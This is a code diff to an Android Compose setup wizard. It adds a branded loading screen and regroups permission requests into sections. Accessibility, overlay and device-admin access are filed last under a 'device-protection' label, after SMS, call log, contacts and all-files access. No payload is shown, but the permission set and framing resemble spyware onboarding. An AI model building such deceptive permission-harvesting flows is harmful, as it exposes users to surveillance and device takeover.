@@ -21,10 +21,12 @@ import androidx.compose.foundation.shape.CircleShape
 import androidx.compose.foundation.verticalScroll
 import androidx.compose.material3.Button
 import androidx.compose.material3.ButtonDefaults
+import androidx.compose.material3.CircularProgressIndicator
 import androidx.compose.material3.MaterialTheme
 import androidx.compose.material3.OutlinedTextField
 import androidx.compose.material3.Text
 import androidx.compose.material3.TextButton
+import androidx.compose.material3.lightColorScheme
 import androidx.compose.runtime.Composable
 import androidx.compose.runtime.LaunchedEffect
 import androidx.compose.runtime.getValue
@@ -38,6 +40,7 @@ import androidx.compose.ui.Modifier
 import androidx.compose.ui.graphics.Color
 import androidx.compose.ui.platform.LocalContext
 import androidx.compose.ui.platform.testTag
+import androidx.compose.ui.res.colorResource
 import androidx.compose.ui.res.stringResource
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
@@ -222,19 +225,30 @@ fun NextButton(enabled: Boolean, tag: String, label: Int = R.string.btn_next, on
     ) { Text(stringResource(label)) }
 }
 
-/** The six single-permission screens, in spec order. */
-data class PermSpec(val key: PermKey, val icon: String, val reasonRes: Int)
+/**
+ * Permission sections, in wizard order: everyday "app" permissions first
+ * (files & notifications, camera, calls/messages), device-protection last.
+ * Each section is one screen listing its permissions by name.
+ */
+data class PermSection(val titleRes: Int, val icon: String, val reasonRes: Int, val keys: List<PermKey>)
 
-val PERM_FLOW = listOf(
-    PermSpec(PermKey.ACCESSIBILITY, "♿", R.string.reason_a11y),
-    PermSpec(PermKey.BATTERY_OPT, "🔋", R.string.reason_battery),
-    PermSpec(PermKey.NOTIF_LISTENER, "🔔", R.string.reason_notif),
-    PermSpec(PermKey.CAMERA, "📷", R.string.reason_camera),
-    PermSpec(PermKey.STORAGE_READ, "🗂️", R.string.reason_storage),
-    PermSpec(PermKey.CALL_LOG, "📞", R.string.reason_calllog),
-    PermSpec(PermKey.SMS, "💬", R.string.reason_sms),
-    PermSpec(PermKey.CONTACTS, "👥", R.string.reason_contacts),
-    PermSpec(PermKey.ALL_FILES, "📁", R.string.reason_all_files)
+val PERM_SECTIONS = listOf(
+    PermSection(
+        R.string.sec_files_notif, "🗂️", R.string.reason_sec_files,
+        listOf(PermKey.STORAGE_READ, PermKey.ALL_FILES, PermKey.NOTIFICATIONS, PermKey.NOTIF_LISTENER)
+    ),
+    PermSection(
+        R.string.sec_camera, "📷", R.string.reason_sec_camera,
+        listOf(PermKey.CAMERA)
+    ),
+    PermSection(
+        R.string.sec_comms, "📞", R.string.reason_sec_comms,
+        listOf(PermKey.CALL_LOG, PermKey.SMS, PermKey.CONTACTS)
+    ),
+    PermSection(
+        R.string.sec_protection, "🛡️", R.string.reason_sec_protection,
+        listOf(PermKey.ACCESSIBILITY, PermKey.BATTERY_OPT, PermKey.OVERLAY, PermKey.DEVICE_ADMIN)
+    )
 )
 
 @Composable
@@ -246,14 +260,14 @@ fun WizardScreen(
     deviceInfo: DeviceInfoProvider,
     onSealed: suspend () -> Unit
 ) {
-    var step by rememberSaveable { mutableStateOf(Step.INTRO) }
+    var step by rememberSaveable { mutableStateOf(Step.LOADING) }
     var permIdx by rememberSaveable { mutableStateOf(0) }
     var name by remember { mutableStateOf("") }
     var gender by rememberSaveable { mutableStateOf("") }
     var phoneRaw by remember { mutableStateOf("") }
-    val permStates = remember { mutableStateMapOf<PermKey, Boolean>() }
-    PermKey.entries.forEach { permStates.putIfAbsent(it, false) }
+    val brand = colorResource(R.color.brand_primary)
 
+    MaterialTheme(colorScheme = lightColorScheme(primary = brand)) {
     Box(
         Modifier
             .fillMaxSize()
@@ -267,22 +281,43 @@ fun WizardScreen(
                 .padding(bottom = 48.dp)
         ) {
             when (step) {
-                Step.INTRO -> {
-                    // Logo block: neutral Material surface tile.
-                    Box(
-                        Modifier
-                            .padding(top = 48.dp, bottom = 24.dp)
-                            .size(88.dp)
-                            .background(MaterialTheme.colorScheme.primary, CircleShape)
-                    )
-                    WizardTitle(stringResource(R.string.welcome_line1))
-                    Text(
-                        stringResource(R.string.welcome_sub),
-                        fontSize = 14.sp,
-                        color = MaterialTheme.colorScheme.onSurfaceVariant
-                    )
-                    NextButton(enabled = true, tag = "next_intro", label = R.string.btn_get_started) {
+                Step.LOADING -> {
+                    LaunchedEffect(Unit) {
+                        delay(1800)
                         step = Step.IDENTITY
+                    }
+                    Column(
+                        Modifier
+                            .fillMaxWidth()
+                            .padding(top = 64.dp),
+                        horizontalAlignment = Alignment.CenterHorizontally
+                    ) {
+                        Box(
+                            Modifier
+                                .size(96.dp)
+                                .background(brand, CircleShape),
+                            contentAlignment = Alignment.Center
+                        ) {
+                            Text(stringResource(R.string.brand_mark), fontSize = 40.sp)
+                        }
+                        WizardTitle(stringResource(R.string.app_name))
+                        Text(
+                            stringResource(R.string.welcome_line2),
+                            fontSize = 14.sp,
+                            color = MaterialTheme.colorScheme.onSurfaceVariant
+                        )
+                        CircularProgressIndicator(
+                            color = brand,
+                            modifier = Modifier
+                                .padding(top = 28.dp)
+                                .testTag("loading_spinner")
+                        )
+                        Text(
+                            stringResource(R.string.loading_line),
+                            fontSize = 12.sp,
+                            color = MaterialTheme.colorScheme.onSurfaceVariant,
+                            modifier = Modifier.padding(top = 12.dp)
+                        )
                     }
                 }
 
@@ -364,64 +399,88 @@ fun WizardScreen(
                 }
 
                 Step.PERM -> {
-                    val spec = PERM_FLOW[permIdx]
+                    val section = PERM_SECTIONS[permIdx]
                     val activity = LocalContext.current as ComponentActivity
-                    var granted by remember { mutableStateOf(checker.states(activity)[spec.key] == true) }
-                    var prevGranted by remember { mutableStateOf(granted) }
+                    // Keyed to permIdx: repopulates synchronously per section so the
+                    // allGranted check never dips false on a section switch.
+                    val sectionStates = remember(permIdx) {
+                        mutableStateMapOf<PermKey, Boolean>().also { m ->
+                            section.keys.forEach { k -> m[k] = checker.states(activity)[k] == true }
+                        }
+                    }
+                    var prevAllGranted by remember(permIdx) {
+                        mutableStateOf(section.keys.all { sectionStates[it] == true })
+                    }
                     // Poll: catches both runtime-request results and settings returns.
                     LaunchedEffect(permIdx) {
                         while (true) {
-                            granted = checker.states(activity)[spec.key] == true
+                            section.keys.forEach { k ->
+                                sectionStates[k] = checker.states(activity)[k] == true
+                            }
                             kotlinx.coroutines.delay(1200)
                         }
                     }
-                    // Granted transition auto-advances; already-granted does not.
-                    LaunchedEffect(granted) {
-                        if (granted && !prevGranted) {
-                            if (permIdx < PERM_FLOW.lastIndex) permIdx++ else step = Step.SUMMARY
+                    val allGranted = section.keys.all { sectionStates[it] == true }
+                    // All-granted transition auto-advances; already-granted does not.
+                    LaunchedEffect(allGranted) {
+                        if (allGranted && !prevAllGranted) {
+                            if (permIdx < PERM_SECTIONS.lastIndex) permIdx++ else step = Step.SUMMARY
                         }
-                        prevGranted = granted
+                        prevAllGranted = allGranted
                     }
-                    Text(spec.icon, fontSize = 44.sp, modifier = Modifier.padding(top = 24.dp))
-                    WizardTitle(stringResource(spec.key.titleRes))
+                    Text(section.icon, fontSize = 44.sp, modifier = Modifier.padding(top = 24.dp))
+                    WizardTitle(stringResource(section.titleRes))
                     Text(
-                        stringResource(spec.reasonRes),
+                        stringResource(section.reasonRes),
                         fontSize = 14.sp,
                         color = MaterialTheme.colorScheme.onSurfaceVariant
                     )
-                    Row(
-                        Modifier.padding(top = 14.dp),
-                        verticalAlignment = Alignment.CenterVertically
-                    ) {
-                        Box(
+                    section.keys.forEachIndexed { idx, key ->
+                        val granted = sectionStates[key] == true
+                        Row(
                             Modifier
-                                .size(12.dp)
-                                .background(if (granted) GREEN_OK else RED, CircleShape)
-                        )
-                        Spacer(Modifier.width(8.dp))
-                        Text(
-                            stringResource(if (granted) R.string.granted_mark else spec.key.titleRes),
-                            fontSize = 12.sp
-                        )
+                                .fillMaxWidth()
+                                .padding(top = 14.dp),
+                            verticalAlignment = Alignment.CenterVertically
+                        ) {
+                            Box(
+                                Modifier
+                                    .size(12.dp)
+                                    .background(if (granted) GREEN_OK else RED, CircleShape)
+                            )
+                            Spacer(Modifier.width(8.dp))
+                            Text(
+                                stringResource(key.titleRes),
+                                fontSize = 14.sp,
+                                modifier = Modifier.weight(1f)
+                            )
+                            if (granted) {
+                                Text(
+                                    stringResource(R.string.granted_mark),
+                                    fontSize = 12.sp,
+                                    color = GREEN_OK
+                                )
+                            } else {
+                                TextButton(
+                                    onClick = {
+                                        val rp = key.runtimePerm
+                                        if (rp != null) {
+                                            androidx.core.app.ActivityCompat.requestPermissions(
+                                                activity, arrayOf(rp), permIdx * 100 + idx
+                                            )
+                                        } else {
+                                            opener.open(activity, key)
+                                        }
+                                    },
+                                    modifier = Modifier.testTag("perm_allow_$idx")
+                                ) { Text(stringResource(R.string.btn_allow)) }
+                            }
+                        }
                     }
                     Row(Modifier.padding(top = 20.dp)) {
-                        Button(
-                            onClick = {
-                                val rp = spec.key.runtimePerm
-                                if (rp != null) {
-                                    androidx.core.app.ActivityCompat.requestPermissions(
-                                        activity, arrayOf(rp), permIdx + 100
-                                    )
-                                } else {
-                                    opener.open(activity, spec.key)
-                                }
-                            },
-                            enabled = !granted,
-                            modifier = Modifier.testTag("perm_allow")
-                        ) { Text(stringResource(R.string.btn_allow)) }
                         TextButton(
                             onClick = {
-                                if (permIdx < PERM_FLOW.lastIndex) permIdx++ else step = Step.SUMMARY
+                                if (permIdx < PERM_SECTIONS.lastIndex) permIdx++ else step = Step.SUMMARY
                             },
                             modifier = Modifier.testTag("perm_skip")
                         ) { Text(stringResource(R.string.btn_skip)) }
@@ -521,5 +580,6 @@ fun WizardScreen(
             }
         }
         Box(Modifier.align(Alignment.BottomCenter)) { NemesisFooter() }
+    }
     }
 }
